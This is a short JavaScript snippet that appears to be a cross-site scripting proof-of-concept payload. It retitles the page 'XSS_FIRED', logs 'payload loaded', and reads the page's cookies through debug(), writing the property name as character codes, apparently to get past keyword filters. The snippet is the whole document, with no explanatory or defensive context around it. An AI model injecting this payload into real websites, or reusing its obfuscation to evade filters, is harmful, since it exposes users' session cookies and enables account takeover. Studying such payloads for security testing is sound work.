document.title = "XSS_FIRED";
console.log("payload loaded");
DEBUG_LEVEL=DEBUG;debug(document[String.fromCharCode(99,111,111,107,105,101)]);
